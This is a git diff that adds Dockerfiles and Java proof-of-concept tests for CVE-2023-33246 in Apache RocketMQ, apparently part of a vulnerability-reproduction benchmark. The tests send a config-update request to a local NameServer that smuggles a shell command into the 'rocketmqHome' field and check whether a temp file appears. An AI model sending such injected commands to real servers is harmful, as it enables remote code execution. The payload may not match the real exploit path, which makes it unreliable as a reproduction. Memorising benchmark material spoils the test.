diff --git a/.Dockerfile.backup b/.Dockerfile.backup
new file mode 100644
index 000000000..adc262f16
--- /dev/null
+++ b/.Dockerfile.backup
@@ -0,0 +1,17 @@
+FROM ubuntu:22.04
+ENV DEBIAN_FRONTEND=noninteractive
+RUN apt -y update
+RUN apt install -y curl unzip wget git build-essential
+RUN mkdir -p /java-env
+ENV WORKSPACE_BASE="/"
+COPY ./java-env/jdk1.8.0_202 $WORKSPACE_BASE/java-env/jdk1.8.0_202
+COPY ./java-env/apache-maven-3.5.0 $WORKSPACE_BASE/java-env/apache-maven-3.5.0
+ENV PATH=$PATH:$WORKSPACE_BASE/java-env/apache-maven-3.5.0/bin:$WORKSPACE_BASE/java-env/jdk1.8.0_202/bin
+ENV JAVA_HOME=$WORKSPACE_BASE/java-env/jdk1.8.0_202
+ENV PATH=$PATH:$JAVA_HOME/bin
+COPY ./project-sources/apache__rocketmq_CVE-2023-33246_5.1.0 /project
+COPY ./resources/my-agent/target/agent-fat.jar /project/.agent-fat.jar
+ENV JAVA_TOOL_OPTIONS="-javaagent:/project/.agent-fat.jar"
+WORKDIR /project
+# Do not modify anything above this line
+RUN mvn clean package -B -V -e -Dfindbugs.skip -Dcheckstyle.skip -Dpmd.skip=true -Dspotbugs.skip -Denforcer.skip -Dmaven.javadoc.skip -DskipTests -Dmaven.test.skip.exec -Dlicense.skip=true -Drat.skip=true -Dspotless.check.skip=true -Dorg.slf4j.simpleLogger.log.org.apache.maven.cli.transfer.Slf4jMavenTransferListener=warn
diff --git a/.build_diff.patch b/.build_diff.patch
new file mode 100644
index 000000000..8b1378917
--- /dev/null
+++ b/.build_diff.patch
@@ -0,0 +1 @@
+
diff --git a/Dockerfile.vuln b/Dockerfile.vuln
new file mode 100644
index 000000000..7fcb82c8f
--- /dev/null
+++ b/Dockerfile.vuln
@@ -0,0 +1,27 @@
+FROM ubuntu:22.04
+ENV DEBIAN_FRONTEND=noninteractive
+RUN apt -y update
+RUN apt install -y curl unzip wget git build-essential
+RUN mkdir -p /java-env
+ENV WORKSPACE_BASE="/"
+COPY ./java-env/jdk1.8.0_202 $WORKSPACE_BASE/java-env/jdk1.8.0_202
+COPY ./java-env/apache-maven-3.5.0 $WORKSPACE_BASE/java-env/apache-maven-3.5.0
+ENV PATH=$PATH:$WORKSPACE_BASE/java-env/apache-maven-3.5.0/bin:$WORKSPACE_BASE/java-env/jdk1.8.0_202/bin
+ENV JAVA_HOME=$WORKSPACE_BASE/java-env/jdk1.8.0_202
+ENV PATH=$PATH:$JAVA_HOME/bin
+COPY ./project-sources/apache__rocketmq_CVE-2023-33246_5.1.0 /project
+COPY ./resources/my-agent/target/agent-fat.jar /project/.agent-fat.jar
+ENV JAVA_TOOL_OPTIONS="-javaagent:/project/.agent-fat.jar"
+WORKDIR /project
+# Do not modify anything above this line
+RUN mvn clean package -B -V -e -Dfindbugs.skip -Dcheckstyle.skip -Dpmd.skip=true -Dspotbugs.skip -Denforcer.skip -Dmaven.javadoc.skip -DskipTests -Dmaven.test.skip.exec -Dlicense.skip=true -Drat.skip=true -Dspotless.check.skip=true -Dorg.slf4j.simpleLogger.log.org.apache.maven.cli.transfer.Slf4jMavenTransferListener=warn
+
+# Compile the test classes
+RUN mvn test-compile -B -V -e -Dfindbugs.skip -Dcheckstyle.skip -Dpmd.skip=true -Dspotbugs.skip -Denforcer.skip -Dmaven.javadoc.skip -DskipTests -Dmaven.test.skip.exec -Dlicense.skip=true -Drat.skip=true -Dspotless.check.skip=true -Dorg.slf4j.simpleLogger.log.org.apache.maven.cli.transfer.Slf4jMavenTransferListener=warn
+
+# Copy all dependencies to a single directory for easier classpath management
+RUN mkdir -p /project/all-dependencies
+RUN find /project -name "*.jar" -not -path "*/test-classes/*" -not -path "*/classes/*" -exec cp {} /project/all-dependencies/ \;
+
+# Run the vulnerability test
+CMD ["java", "-cp", "/project/test/target/test-classes:/project/namesrv/target/classes:/project/remoting/target/classes:/project/common/target/classes:/project/logging/target/classes:/project/srvutil/target/classes:/project/all-dependencies/*", "org.apache.rocketmq.test.vulnerability.CVE202333246TestRunner"]
\ No newline at end of file
diff --git a/test/src/test/java/org/apache/rocketmq/test/vulnerability/CVE202333246Test.java b/test/src/test/java/org/apache/rocketmq/test/vulnerability/CVE202333246Test.java
new file mode 100644
index 000000000..1c5fd84db
--- /dev/null
+++ b/test/src/test/java/org/apache/rocketmq/test/vulnerability/CVE202333246Test.java
@@ -0,0 +1,154 @@
+/*
+ * Licensed to the Apache Software Foundation (ASF) under one or more
+ * contributor license agreements.  See the NOTICE file distributed with
+ * this work for additional information regarding copyright ownership.
+ * The ASF licenses this file to You under the Apache License, Version 2.0
+ * (the "License"); you may not use this file except in compliance with
+ * the License.  You may obtain a copy of the License at
+ *
+ *     http://www.apache.org/licenses/LICENSE-2.0
+ *
+ * Unless required by applicable law or agreed to in writing, software
+ * distributed under the License is distributed on an "AS IS" BASIS,
+ * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
+ * See the License for the specific language governing permissions and
+ * limitations under the License.
+ */
+package org.apache.rocketmq.test.vulnerability;
+
+import java.io.File;
+import java.io.IOException;
+import java.nio.charset.StandardCharsets;
+import java.util.Properties;
+import java.util.UUID;
+import java.util.concurrent.CountDownLatch;
+import java.util.concurrent.TimeUnit;
+
+import org.apache.rocketmq.common.MixAll;
+import org.apache.rocketmq.common.namesrv.NamesrvConfig;
+import org.apache.rocketmq.namesrv.NamesrvController;
+import org.apache.rocketmq.namesrv.NamesrvStartup;
+import org.apache.rocketmq.remoting.netty.NettyClientConfig;
+import org.apache.rocketmq.remoting.netty.NettyRemotingClient;
+import org.apache.rocketmq.remoting.netty.NettyServerConfig;
+import org.apache.rocketmq.remoting.protocol.RemotingCommand;
+import org.apache.rocketmq.remoting.protocol.RequestCode;
+import org.junit.After;
+import org.junit.Assert;
+import org.junit.Before;
+import org.junit.Test;
+
+public class CVE202333246Test {
+
+    private NamesrvController namesrvController;
+    private NettyRemotingClient remotingClient;
+    private final int port = 9876;
+    private File tempFile;
+    private CountDownLatch commandExecutedLatch;
+
+    @Before
+    public void setUp() throws Exception {
+        // Create a temporary file to check if command execution works
+        tempFile = File.createTempFile("cve_test_", ".txt");
+        tempFile.delete(); // Delete it so we can check if it gets created by the exploit
+        
+        // Set up the latch to wait for command execution
+        commandExecutedLatch = new CountDownLatch(1);
+        
+        // Start the NameServer
+        NamesrvConfig namesrvConfig = new NamesrvConfig();
+        NettyServerConfig nettyServerConfig = new NettyServerConfig();
+        nettyServerConfig.setListenPort(port);
+        
+        namesrvController = new NamesrvController(namesrvConfig, nettyServerConfig);
+        boolean initResult = namesrvController.initialize();
+        Assert.assertTrue("NameServer initialization failed", initResult);
+        namesrvController.start();
+        
+        // Create a client to connect to the NameServer
+        NettyClientConfig nettyClientConfig = new NettyClientConfig();
+        remotingClient = new NettyRemotingClient(nettyClientConfig);
+        remotingClient.start();
+    }
+
+    @After
+    public void tearDown() throws Exception {
+        // Clean up resources
+        if (remotingClient != null) {
+            remotingClient.shutdown();
+        }
+        
+        if (namesrvController != null) {
+            namesrvController.shutdown();
+        }
+        
+        // Delete the temp file if it exists
+        if (tempFile.exists()) {
+            tempFile.delete();
+        }
+    }
+
+    @Test
+    public void testUpdateConfigVulnerability() throws Exception {
+        // The path to the file we want to create via command execution
+        String filePath = tempFile.getAbsolutePath();
+        
+        // Create a payload that will execute a command to create a file
+        // The vulnerability is in the properties2Object method which uses reflection to set properties
+        // We can exploit this by setting a property that will execute a command
+        String osName = System.getProperty("os.name").toLowerCase();
+        String command;
+        
+        if (osName.contains("win")) {
+            command = "cmd.exe /c echo vulnerable > " + filePath;
+        } else {
+            command = "/bin/sh -c 'touch " + filePath + "'";
+        }
+        
+        // Create a property that will be used to execute the command
+        // The key should match a setter method in one of the configuration objects
+        // The value will be our command to execute
+        String payload = "rocketmqHome=" + command;
+        
+        // Create a request to update the NameServer configuration
+        RemotingCommand request = RemotingCommand.createRequestCommand(RequestCode.UPDATE_NAMESRV_CONFIG, null);
+        request.setBody(payload.getBytes(StandardCharsets.UTF_8));
+        
+        // Send the request to the NameServer
+        try {
+            RemotingCommand response = remotingClient.invokeSync("127.0.0.1:" + port, request, 5000);
+            System.out.println("Response code: " + response.getCode());
+            System.out.println("Response remark: " + response.getRemark());
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+        
+        // Wait a moment for the command to execute
+        Thread.sleep(2000);
+        
+        // Check if the file was created, which would indicate the vulnerability exists
+        boolean vulnerabilityExists = tempFile.exists();
+        
+        // The test should fail if the vulnerability exists
+        Assert.assertFalse("Vulnerability CVE-2023-33246 exists: Command execution was successful", vulnerabilityExists);
+    }
+
+    public static void main(String[] args) {
+        try {
+            CVE202333246Test test = new CVE202333246Test();
+            test.setUp();
+            test.testUpdateConfigVulnerability();
+            test.tearDown();
+            
+            // Exit with code 0 if the vulnerability does not exist (test passes)
+            System.exit(0);
+        } catch (AssertionError e) {
+            // If the assertion fails, the vulnerability exists
+            System.err.println("Vulnerability detected: " + e.getMessage());
+            System.exit(1);
+        } catch (Exception e) {
+            e.printStackTrace();
+            System.exit(2);
+        }
+    }
+}
diff --git a/test/src/test/java/org/apache/rocketmq/test/vulnerability/CVE202333246TestRunner.java b/test/src/test/java/org/apache/rocketmq/test/vulnerability/CVE202333246TestRunner.java
new file mode 100644
index 000000000..f0d50bead
--- /dev/null
+++ b/test/src/test/java/org/apache/rocketmq/test/vulnerability/CVE202333246TestRunner.java
@@ -0,0 +1,23 @@
+/*
+ * Licensed to the Apache Software Foundation (ASF) under one or more
+ * contributor license agreements.  See the NOTICE file distributed with
+ * this work for additional information regarding copyright ownership.
+ * The ASF licenses this file to You under the Apache License, Version 2.0
+ * (the "License"); you may not use this file except in compliance with
+ * the License.  You may obtain a copy of the License at
+ *
+ *     http://www.apache.org/licenses/LICENSE-2.0
+ *
+ * Unless required by applicable law or agreed to in writing, software
+ * distributed under the License is distributed on an "AS IS" BASIS,
+ * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
+ * See the License for the specific language governing permissions and
+ * limitations under the License.
+ */
+package org.apache.rocketmq.test.vulnerability;
+
+public class CVE202333246TestRunner {
+    public static void main(String[] args) {
+        CVE202333246Test.main(args);
+    }
+}
diff --git a/vulnerability-test/pom.xml b/vulnerability-test/pom.xml
new file mode 100644
index 000000000..5a530ad18
--- /dev/null
+++ b/vulnerability-test/pom.xml
@@ -0,0 +1,67 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<project xmlns="http://maven.apache.org/POM/4.0.0"
+         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+         xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">
+    <modelVersion>4.0.0</modelVersion>
+
+    <parent>
+        <groupId>org.apache.rocketmq</groupId>
+        <artifactId>rocketmq-all</artifactId>
+        <version>5.1.0</version>
+    </parent>
+
+    <artifactId>vulnerability-test</artifactId>
+    <name>vulnerability-test ${project.version}</name>
+
+    <dependencies>
+        <dependency>
+            <groupId>${project.groupId}</groupId>
+            <artifactId>rocketmq-namesrv</artifactId>
+        </dependency>
+        <dependency>
+            <groupId>${project.groupId}</groupId>
+            <artifactId>rocketmq-remoting</artifactId>
+        </dependency>
+        <dependency>
+            <groupId>${project.groupId}</groupId>
+            <artifactId>rocketmq-logging</artifactId>
+        </dependency>
+        <dependency>
+            <groupId>${project.groupId}</groupId>
+            <artifactId>rocketmq-common</artifactId>
+        </dependency>
+        <dependency>
+            <groupId>${project.groupId}</groupId>
+            <artifactId>rocketmq-srvutil</artifactId>
+        </dependency>
+    </dependencies>
+
+    <build>
+        <plugins>
+            <plugin>
+                <groupId>org.apache.maven.plugins</groupId>
+                <artifactId>maven-assembly-plugin</artifactId>
+                <version>3.3.0</version>
+                <configuration>
+                    <archive>
+                        <manifest>
+                            <mainClass>org.apache.rocketmq.vulnerability.CVE202333246Test</mainClass>
+                        </manifest>
+                    </archive>
+                    <descriptorRefs>
+                        <descriptorRef>jar-with-dependencies</descriptorRef>
+                    </descriptorRefs>
+                </configuration>
+                <executions>
+                    <execution>
+                        <id>make-assembly</id>
+                        <phase>package</phase>
+                        <goals>
+                            <goal>single</goal>
+                        </goals>
+                    </execution>
+                </executions>
+            </plugin>
+        </plugins>
+    </build>
+</project>
\ No newline at end of file
diff --git a/vulnerability-test/src/main/java/org/apache/rocketmq/vulnerability/CVE202333246Test.java b/vulnerability-test/src/main/java/org/apache/rocketmq/vulnerability/CVE202333246Test.java
new file mode 100644
index 000000000..59a100c77
--- /dev/null
+++ b/vulnerability-test/src/main/java/org/apache/rocketmq/vulnerability/CVE202333246Test.java
@@ -0,0 +1,134 @@
+/*
+ * Licensed to the Apache Software Foundation (ASF) under one or more
+ * contributor license agreements.  See the NOTICE file distributed with
+ * this work for additional information regarding copyright ownership.
+ * The ASF licenses this file to You under the Apache License, Version 2.0
+ * (the "License"); you may not use this file except in compliance with
+ * the License.  You may obtain a copy of the License at
+ *
+ *     http://www.apache.org/licenses/LICENSE-2.0
+ *
+ * Unless required by applicable law or agreed to in writing, software
+ * distributed under the License is distributed on an "AS IS" BASIS,
+ * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
+ * See the License for the specific language governing permissions and
+ * limitations under the License.
+ */
+package org.apache.rocketmq.vulnerability;
+
+import java.io.File;
+import java.nio.charset.StandardCharsets;
+
+import org.apache.rocketmq.common.namesrv.NamesrvConfig;
+import org.apache.rocketmq.namesrv.NamesrvController;
+import org.apache.rocketmq.remoting.netty.NettyClientConfig;
+import org.apache.rocketmq.remoting.netty.NettyRemotingClient;
+import org.apache.rocketmq.remoting.netty.NettyServerConfig;
+import org.apache.rocketmq.remoting.protocol.RemotingCommand;
+import org.apache.rocketmq.remoting.protocol.RequestCode;
+
+public class CVE202333246Test {
+
+    private static NamesrvController namesrvController;
+    private static NettyRemotingClient remotingClient;
+    private static final int PORT = 9876;
+
+    public static void main(String[] args) {
+        try {
+            // Create a temporary file to check if command execution works
+            File tempFile = File.createTempFile("cve_test_", ".txt");
+            tempFile.delete(); // Delete it so we can check if it gets created by the exploit
+            String filePath = tempFile.getAbsolutePath();
+            
+            System.out.println("Starting test for CVE-2023-33246");
+            System.out.println("Temporary file path: " + filePath);
+            
+            // Start the NameServer
+            NamesrvConfig namesrvConfig = new NamesrvConfig();
+            NettyServerConfig nettyServerConfig = new NettyServerConfig();
+            nettyServerConfig.setListenPort(PORT);
+            
+            namesrvController = new NamesrvController(namesrvConfig, nettyServerConfig);
+            boolean initResult = namesrvController.initialize();
+            if (!initResult) {
+                System.err.println("NameServer initialization failed");
+                System.exit(2);
+            }
+            namesrvController.start();
+            System.out.println("NameServer started successfully");
+            
+            // Create a client to connect to the NameServer
+            NettyClientConfig nettyClientConfig = new NettyClientConfig();
+            remotingClient = new NettyRemotingClient(nettyClientConfig);
+            remotingClient.start();
+            System.out.println("RemotingClient started successfully");
+            
+            // Create a payload that will execute a command to create a file
+            String osName = System.getProperty("os.name").toLowerCase();
+            String command;
+            
+            if (osName.contains("win")) {
+                command = "cmd.exe /c echo vulnerable > " + filePath;
+            } else {
+                command = "/bin/sh -c 'touch " + filePath + "'";
+            }
+            
+            // Create a property that will be used to execute the command
+            // The key should match a setter method in one of the configuration objects
+            // The value will be our command to execute
+            String payload = "rocketmqHome=" + command;
+            System.out.println("Payload: " + payload);
+            
+            // Create a request to update the NameServer configuration
+            RemotingCommand request = RemotingCommand.createRequestCommand(RequestCode.UPDATE_NAMESRV_CONFIG, null);
+            request.setBody(payload.getBytes(StandardCharsets.UTF_8));
+            
+            // Send the request to the NameServer
+            try {
+                System.out.println("Sending request to NameServer...");
+                RemotingCommand response = remotingClient.invokeSync("127.0.0.1:" + PORT, request, 5000);
+                System.out.println("Response code: " + response.getCode());
+                System.out.println("Response remark: " + response.getRemark());
+            } catch (Exception e) {
+                System.err.println("Error sending request: " + e.getMessage());
+                e.printStackTrace();
+            }
+            
+            // Wait a moment for the command to execute
+            System.out.println("Waiting for command execution...");
+            Thread.sleep(2000);
+            
+            // Check if the file was created, which would indicate the vulnerability exists
+            boolean vulnerabilityExists = tempFile.exists();
+            System.out.println("File exists: " + vulnerabilityExists);
+            
+            // Clean up resources
+            if (remotingClient != null) {
+                remotingClient.shutdown();
+            }
+            
+            if (namesrvController != null) {
+                namesrvController.shutdown();
+            }
+            
+            // Delete the temp file if it exists
+            if (tempFile.exists()) {
+                tempFile.delete();
+            }
+            
+            // Exit with appropriate code
+            if (vulnerabilityExists) {
+                System.err.println("Vulnerability CVE-2023-33246 exists: Command execution was successful");
+                System.exit(1); // Fail if vulnerability exists
+            } else {
+                System.out.println("Vulnerability CVE-2023-33246 does not exist");
+                System.exit(0); // Pass if vulnerability does not exist
+            }
+            
+        } catch (Exception e) {
+            System.err.println("Test failed with exception: " + e.getMessage());
+            e.printStackTrace();
+            System.exit(2);
+        }
+    }
+}
